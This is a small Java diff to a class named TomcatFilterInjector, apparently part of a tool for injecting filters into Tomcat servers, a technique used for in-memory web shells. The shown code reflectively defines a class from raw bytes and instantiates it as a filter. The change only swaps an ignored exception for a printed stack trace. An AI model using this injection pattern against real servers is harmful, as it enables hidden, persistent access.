@@ -197,7 +197,8 @@ public class TomcatFilterInjector {
                 defineClass.setAccessible(true);
                 Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                 filter = clazz.newInstance();
-            } catch (Throwable ignored) {
+            } catch (Throwable e1) {
+                e1.printStackTrace();
             }
         }
         return filter;
